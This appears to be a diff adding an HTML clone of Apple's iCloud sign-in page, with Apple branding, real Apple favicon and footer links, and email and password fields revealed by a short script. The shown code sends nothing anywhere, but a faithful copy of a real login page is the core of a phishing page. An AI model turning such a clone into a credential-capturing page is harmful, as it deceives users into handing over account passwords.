@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr" data-supports-webp="" class="js-focus-visible" data-js-focus-visible="" data-primary-interaction-mode="mouse" data-device-type-class="desktop">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://www.icloud.com/system/icloud.com/2426Hotfix51/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://www.icloud.com/system/icloud.com/2426Hotfix51/favicon-16x16.png">
+  <link rel="stylesheet" href="./css/index.css">
+  
+  <title>iCloud</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+
+</head>
+<body class="bg-white flex flex-col justify-center items-center">
+  <header class="w-full h-[44px] cloudos-toolbar login overlay">
+    <div class="icloud-logo">
+      <a href="#" aria-label="Navigate to icloud.com home page">
+        <img src="./image/logo.svg" width="82" height="31"/>
+      </a>
+    </div>
+    <div class="action-buttons flex justify-center items-center">        
+      <button type="button" tabindex="-1">
+        <svg class="ellipsis" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" height="22" width="22" aria-hidden="true"><path d="M12.9321097,6.8055484 C12.9321097,3.30883872 10.0968839,0.505161291 6.53720646,0.505161291 C3.07198065,0.505161291 0.236774194,3.30883872 0.236774194,6.8055484 C0.236774194,10.3022581 3.07198065,13.1059355 6.53720646,13.1059355 C10.0968839,13.1059355 12.9321097,10.3022581 12.9321097,6.8055484 Z M36.2435936,6.8055484 C36.2435936,3.30883872 33.4399162,0.505161291 29.9432065,0.505161291 C26.4779807,0.505161291 23.6743033,3.30883872 23.6743033,6.8055484 C23.6743033,10.3022581 26.4779807,13.1059355 29.9432065,13.1059355 C33.4399162,13.1059355 36.2435936,10.3022581 36.2435936,6.8055484 Z M59.6495291,6.8055484 C59.6495291,3.30883872 56.8459162,0.505161291 53.3492065,0.505161291 C49.7894646,0.505161291 46.9857872,3.30883872 46.9857872,6.8055484 C46.9857872,10.3022581 49.7894646,13.1059355 53.3492065,13.1059355 C56.8459162,13.1059355 59.6495291,10.3022581 59.6495291,6.8055484 Z" transform="translate(2 25.226)"></path></svg>
+      </button>
+    </div>
+  </header>
+  <main>
+    <div class="home-login-component">
+      <div class="parent-container">
+        <div class="widget-icon-text">
+          <img src="./image/apple.svg" width="160" height="160" />
+          <div class="sign-in-label">Sign in with Apple&nbsp;Account</div>
+        </div>
+        <!-- <div class=" form-cell-wrapper form-textbox   ">
+          <input type="text" id="account_name_text_field" can-field="accountName" aria-labelledby="apple_id_field_label" autocorrect="off" autocapitalize="off" aria-required="true" required="required" spellcheck="false" ($focus)="appleIdFocusHandler($element)" ($blur)="appleIdBlurHandler()" class="force-ltr form-textbox-input " autocomplete="off" aria-invalid="false">
+          <span aria-hidden="true" id="apple_id_field_label" class=" form-textbox-label  form-label-flyout">             
+            Email or Phone Number
+          </span>
+        </div> -->
+        <!-- Email or Phone Number Input -->
+        <div id="email-container" class="relative w-[480px] max-w-[480px] mt-10 mx-auto">
+          <input 
+            type="text" 
+            id="email-input"
+            placeholder="Email or Phone Number" 
+            class="w-full py-3 px-4 border border-gray-500 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 placeholder-gray-400 transition duration-200"
+          >
+          <img  src="./image/arrow.svg" 
+                id="email-next"
+                class="absolute right-2 top-1/2 transform -translate-y-1/2 w-[26px] y-[26px]" />
+        </div>
+
+        <!-- Password Input -->
+        <div id="password-container" class="relative w-[480px] max-w-[480px]  mx-auto hidden">
+          <input 
+            type="password" 
+            id="password-input"
+            placeholder="Password" 
+            class="w-full py-3 px-4 border border-gray-500 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 placeholder-gray-400 transition duration-200"
+          >
+          <img  src="./image/arrow.svg" 
+                id="password-next"
+                class="absolute right-2 top-1/2 transform -translate-y-1/2 w-[26px] y-[26px]" />
+        </div>
+        
+        <!-- <div class="max-w-[480px] my-10 mx-auto p-3 border border-gray-300 rounded-lg flex items-center justify-start gap-x-2">
+          <span>Email or Phone number</span>
+          <div>
+            <input type="text" id="card-user" class="outline-none">
+            <i class="shared-icon icon_sign_in"></i>
+          </div>
+          
+        </div> -->
+        <!-- <div class="sw-field-container">
+          <div class="form-cell-wrapper">
+            <span>Email or Phone number</span>
+            <div class="input-container">
+              <input type="text" />
+              <img src="./css/arrow.svg" />
+            </div>
+          </div>
+        </div> -->
+        <div class="si-remember-password">
+          <div class="form-checkbox">
+            <input type="checkbox" id="remember-me" {($checked)}="isRememberMeChecked" class="form-checkbox-input">
+            <label id="remember-me-label" class="form-label" for="remember-me">
+              <span class="form-checkbox-indicator" aria-hidden="true"></span>                          Keep me signed in
+            </label>
+          </div>                    
+        </div>
+        <div class="si-container-footer has-remember-me">      
+          <div class="links tk-subbody">
+              <div class="si-forgot-password">
+                  <a id="iforgot-link" class="si-link ax-outline lite-theme-override" ($click)="iforgotLinkClickHandler($element)" href="https://iforgot.apple.com/password/verify/appleid" target="_blank">
+                        Forgot <span class="no-wrap sk-icon sk-icon-after sk-icon-external">password?</span>
+                        <span class="sr-only">Opens in a new window.</span>
+                  </a>
+              </div>
+          </div>
+        </div>
+        <div class="create-account">
+          <span>Create Apple Account</span>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <footer>
+    <div class="legal-footer">
+      <div class="application-content m-auto max-w-[345px] sm:max-w-[690px] flex flex-col sm:flex-row align-center justify-between">
+        <div class="inner-row" role="presentation">
+          <div class="with-separator">
+            <a class="systemStatus" target="_blank" rel="noreferrer" href="https://www.apple.com/support/systemstatus/" aria-label="System Status (opens in a new tab)">System Status</a>  &nbsp;|&nbsp; 
+            <a class="privacy" target="_blank" rel="noreferrer" href="https://www.apple.com/legal/privacy/" aria-label="Privacy Policy (opens in a new tab)">Privacy Policy</a>  &nbsp;|&nbsp; 
+            <a class="terms" target="_blank" rel="noreferrer" href="https://www.apple.com/legal/internet-services/icloud/" aria-label="Terms &amp; Conditions (opens in a new tab)">Terms &amp; Conditions</a>
+        </div>
+      </div>
+      <div class="inner-row" role="presentation">
+        <span class="copyright">Copyright © 2024 Apple Inc. All rights reserved.</span>
+      </div>
+    </div>
+  </footer>
+  <script>
+    const emailInput = document.getElementById("email-input");
+    const emailNextButton = document.getElementById("email-next");
+    const passwordContainer = document.getElementById("password-container");
+    const passwordInput = document.getElementById("password-input");
+
+    // Handle email-next button click
+    emailNextButton.addEventListener("click", (event) => {
+      event.preventDefault();
+      if (emailInput.value.trim() !== "") {
+        emailNextButton.classList.add("fade-out");
+        setTimeout(() => {
+          emailNextButton.classList.add("hidden");
+          passwordContainer.classList.remove("hidden", "fade-out-password");
+          passwordContainer.classList.add("fade-in-password");
+        }, 300);
+      }
+    });
+
+    // Handle changes to email-input
+    emailInput.addEventListener("input", () => {
+      if (!passwordContainer.classList.contains("hidden")) {
+        passwordContainer.classList.add("fade-out");
+        setTimeout(() => {
+          passwordContainer.classList.add("hidden");
+          emailNextButton.classList.remove("hidden", "fade-out-next-btn");
+          emailNextButton.classList.add("fade-in-next-btn");
+        }, 300);
+      }
+    });
+  </script>
+  
+</body>
+</html>
+<!-- <div class="w-full p-3 border border-gray-300 rounded-lg flex items-center justify-start gap-x-2">
+  <div>
+    <img src="./Assets/icon-card.svg">
+  </div>
+  <input type="text" class="outline-none">
+</div> -->
